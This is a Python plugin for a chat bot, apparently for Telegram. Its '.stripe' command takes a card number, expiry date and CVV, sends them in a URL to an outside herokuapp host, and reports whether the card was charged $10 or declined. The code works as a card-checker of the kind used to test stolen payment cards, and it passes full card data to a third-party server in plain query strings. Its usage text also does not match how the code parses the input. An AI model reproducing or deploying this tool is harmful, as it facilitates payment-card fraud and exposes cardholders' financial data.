from requests import get

from ._handler import newMsg


def get_uuid(cc, exp, cvc):
    """
    Get a uuid from Stripe.
    """
    url = "https://rosemirrorbot.herokuapp.com/stripe?cc=" + cc + "|" + exp + "|" + cvc
    response = get(url, timeout=16)
    resp = response.json()
    return resp["status"], resp["dcode"], resp["message"], resp["time"]


@newMsg(pattern="stripe")
async def _stripe(e):
    try:
        arg = e.text.split(" ", 1)[1]
    except IndexError:
        await e.reply("`Usage: .stripe <card number> <cvc> <exp>`")
        return
    message = await e.reply("`Processing...`")
    cc, exp_mo, exp_year, cvv = arg.split("|", 3)
    if len(exp_year) == 4:
        exp_year = exp_year[2:]
    exp = exp_mo + "|" + exp_year
    cc = cc.replace(" ", "")
    result, code, msg, time = get_uuid(cc, exp, cvv)
    if result == "success":
        msg = """
        ```Card has been successfully charged.```
        card: ```{}```
        amount: ```$10.00```
        gateway: ```Stripe```
        status: ```Success```
        time taken: ```{}```
        """.format(
            cc, round(int(time), 2)
        )
    else:
        msg = """
        ```Card has been declined.```
        card: ```{}```
        message: ```{}```
        decline_code: ```{}```
        gateway: ```stripe```
        status: ```Declined```
        time taken: ```{} seconds```
        """.format(
            cc, msg, code, round(int(time), 2)
        )
    await message.edit(msg)
